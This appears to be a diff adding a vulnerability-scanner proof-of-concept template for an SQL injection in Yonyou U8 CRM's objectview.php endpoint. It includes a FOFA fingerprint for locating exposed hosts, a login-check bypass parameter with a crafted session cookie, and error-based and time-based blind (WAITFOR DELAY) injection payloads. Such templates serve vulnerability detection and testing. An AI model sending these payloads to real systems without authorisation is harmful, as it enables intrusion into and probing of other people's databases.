@@ -1,0 +1,25 @@
+id: poc-yaml-yongyon-u8-crm-objectview-php-sqli
+info:
+  name: 用友U8 CRM objectview.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /pub/objectview.php?DontCheckLogin=1&ObjType=1&ID=1'
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+  expression: status_code == 302 && contains(body,"Fatal error")
+- method: POST
+  path: /pub/objectview.php
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded
+  data: DontCheckLogin=1&ObjType=1&ID=1';WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: status_code == 302 && body == "" && duration > t1 && duration < t2
+transport: http
